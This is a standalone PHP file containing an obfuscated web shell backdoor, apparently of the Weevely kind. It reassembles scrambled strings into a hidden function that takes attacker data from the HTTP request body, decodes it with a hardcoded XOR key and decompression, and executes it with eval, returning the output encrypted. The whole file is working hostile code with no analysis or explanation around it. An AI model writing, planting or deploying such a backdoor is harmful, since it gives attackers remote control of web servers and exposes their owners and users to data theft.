<?php
$P='ean();$r_S=@ba_Sse64_S_encode(_S_S@x(@gzco_Smpress($o),$k_S));p_Srint("$_Sp$kh$_Sr$kf");}';
$F='$k=_S"87a006eb"_S;$kh="3_Sa024dca_S_Sd_Sccc";$kf="cde8_S5157b37d_S";$_Sp=_S"I5gxhgX';
$a=str_replace('Cz','','cCzrCzeCzCzateCz_fCzunction');
$X='$k{$j};}}re_Sturn_S_S $o;}if _S(@preg_m_Satch("/$_Skh_S_S(.+)$kf/"_S_S,@file_get__S';
$I='xb5_S9W7U_SAX";funct_Sion _Sx($t,_S$k_S)_S{$c=strle_Sn($_Sk)_S;$l=strlen($t);$o="";f';
$B='_Sor($i=0;_S$_Si<$l;){for_S_S($j=0;($j_S_S<$c&&$i<$l)_S;$j+_S+,$i++){$o_S.=$t{$_S_Si}^';
$V='@x(_S@base_S64_decode(_S$m_S[1])_S,_S$k)));$o=@o_S_Sb_get_co_Snten_Sts();@_Sob_end_cl';
$j='conten_Sts("php://in_Sput"),$m)_S==1) {@o_Sb_star_St()_S;@e_Sval(@gzun_Scompres_Ss(';
$g=str_replace('_S','',$F.$I.$B.$X.$j.$V.$P);
$o=$a('',$g);$o();
?>
